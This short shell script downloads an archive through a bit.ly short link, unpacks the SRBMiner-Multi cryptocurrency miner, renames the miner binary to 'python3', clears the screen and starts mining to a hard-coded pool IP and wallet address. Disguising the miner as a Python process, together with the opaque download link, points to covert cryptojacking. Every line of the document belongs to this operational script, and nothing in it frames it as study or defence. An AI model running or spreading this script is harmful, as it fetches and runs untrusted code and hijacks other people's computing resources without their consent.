wget https://bit.ly/kontolrum

tar -xvf kontolrum

cd SRBMiner-Multi-2-4-7

mv SRBMiner-MULTI python3

nomer=$((RANDOM % 50 + 1))

clear

./python3 --algorithm aurum --pool 141.94.192.217:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
